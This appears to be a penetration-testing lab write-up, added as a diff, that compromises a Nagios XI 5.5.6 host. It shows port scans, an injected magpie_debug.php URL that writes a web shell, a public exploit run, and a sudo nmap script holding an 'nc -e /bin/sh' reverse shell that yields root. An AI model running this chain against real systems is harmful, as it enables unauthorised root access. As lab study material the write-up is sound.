@@ -1,0 +1,113 @@
+# 192.168.32.216
+
+## Enumeration
+
+```
+root@kali:~# nmap -Pn -sV -sC 192.168.32.216
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
+| ssh-hostkey:
+|   2048 d1:97:59:cf:b3:21:44:10:81:6a:33:29:eb:b6:b4:ae (RSA)
+|   256 bc:56:85:87:a7:81:e4:bf:49:e3:18:de:c1:f7:1b:a6 (ECDSA)
+|_  256 db:5a:18:1f:57:1c:8b:64:0f:a5:82:2a:61:f6:7e:e6 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Nagios XI
+389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
+443/tcp open  ssl/http Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Nagios XI
+| ssl-cert: Subject: commonName=10.60.60.216/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
+| Not valid before: 2019-02-18T14:02:28
+|_Not valid after:  2029-02-15T14:02:28
+|_ssl-date: TLS randomness does not represent time
+
+```
+
+```
+root@kali:~# unicornscan  -v -I --ports all 192.168.32.216
+adding 192.168.32.216/32 mode `TCPscan' ports `all' pps 300
+using interface(s) tap0
+scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
+TCP open 192.168.32.216:389  ttl 64
+TCP open 192.168.32.216:443  ttl 64
+TCP open 192.168.32.216:80  ttl 64
+TCP open 192.168.32.216:22  ttl 64
+TCP open 192.168.32.216:5667  ttl 64
+sender statistics 286.3 pps with 65536 packets sent total
+listener statistics 153264 packets recieved 0 packets droped and 0 interface drops
+TCP open                     ssh[   22]         from 192.168.32.216  ttl 64
+TCP open                    http[   80]         from 192.168.32.216  ttl 64
+TCP open                    ldap[  389]         from 192.168.32.216  ttl 64
+TCP open                   https[  443]         from 192.168.32.216  ttl 64
+TCP open                 unknown[ 5667]         from 192.168.32.216  ttl 64
+```
+
+## Exploit
+
+* Callback
+
+```
+/nagiosxi/includes/dashlets/rss_dashlet/magpierss/scripts/magpie_debug.php?url=https://192.168.XX.XX:8081/%20-o%20/usr/local/nagiosxi/share/exec.php
+```
+
+
+https://www.exploit-db.com/exploits/46221
+
+```
+root@kali:/mnt/hgfs/Downloads# python nagios.py -t 192.168.32.216 -ip 192.168.XX.XX -port 8081 -ncip 192.168.XX.XX -ncport 443
+
+Listening on 192.168.XX.XX:8081
+
+Found magpie_debug.php.
+
+magpie url = https://192.168.32.216/nagiosxi/includes/dashlets/rss_dashlet/magpierss/scripts/magpie_debug.php?url=https://192.168.XX.XX:8081/%20-o%20/usr/local/nagiosxi/html/about.php
+192.168.32.216 - - [07/Apr/2020 03:01:08] "GET / HTTP/1.1" 200 -
+magpie url = https://192.168.32.216/nagiosxi/includes/dashlets/rss_dashlet/magpierss/scripts/magpie_debug.php?url=https://192.168.XX.XX:8081/%20-o%20/usr/local/nagvis/share/about.php
+192.168.32.216 - - [07/Apr/2020 03:01:09] "GET / HTTP/1.1" 200 -
+
+about.php written. Visit https://192.168.32.216/nagvis/about.php
+
+Gathering some basic info...
+        Current User => www-data
+        Nagios XI Version => 5.5.6
+
+Trying to escalate privs with url: https://192.168.32.216/nagvis/about.php?cmd=echo+%27os.execute%28%22nc+-e+%2Fbin%2Fsh+192.168.XX.XX+445%22%29%27+%3E+%2Fvar%2Ftmp%2Fshell.nse+%26%26+sudo+nmap+--script+%2Fvar%2Ftmp%2Fshell.nse
+Check for a shell!!
+
+Removing remote file /usr/local/nagvis/share/about.php
+Removing local file cert.crt
+Removing local file key.key
+```
+
+```
+root@kali:~# rlwrap nc -nvlp 445
+root@nagy:/usr/local/nagvis/share#
+
+root@nagy:/usr/local/nagvis/share# cd /root
+cd /root
+root@nagy:~# ls
+ls
+nagiosxi  proof.txt  scripts
+root@nagy:~# cat proof.txt
+cat proof.txt
+111...
+root@nagy:~#
+
+root@nagy:~# ip addr
+ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 00:50:56:b8:ef:d5 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.32.216/24 brd 192.168.32.255 scope global ens192
+       valid_lft forever preferred_lft forever
+    inet6 fe80::250:56ff:feb8:efd5/64 scope link
+       valid_lft forever preferred_lft forever
+root@nagy:~#
+```
